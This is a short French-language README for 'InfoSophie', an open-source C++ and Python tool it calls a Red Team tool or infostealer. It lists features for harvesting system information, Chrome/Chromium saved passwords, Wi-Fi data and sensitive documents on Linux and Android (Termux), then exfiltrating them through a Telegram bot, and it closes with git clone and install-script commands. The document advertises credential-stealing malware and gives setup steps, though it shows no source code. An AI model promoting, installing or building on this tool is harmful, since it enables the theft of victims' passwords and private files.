# InfoSophie

**InfoSophie** est un outil Red Team / infostealer open source en C++ et Python, conçu pour collecter des informations système, mots de passe navigateurs, Wi-Fi, fichiers sensibles, et exfiltrer les données via Telegram.

---

## Fonctionnalités

- Collecte d'infos système (Linux et Termux Android)
- Extraction des mots de passe Chrome/Chromium
- Collecte de fichiers sensibles (PDF, TXT, DOCX)
- Exfiltration sécurisée via bot Telegram
- Compatible Linux et Termux (Android)

---

## Prérequis

- Linux 
- Python 3 avec `pycryptodome`
- Compilateur C++ (g++)
- Bot Telegram configuré (token, chat ID)
- Bash shell

---

## Installation

```bash
git clone https://github.com/siriusblack404/infosophie.git
cd infosophie
./install.sh
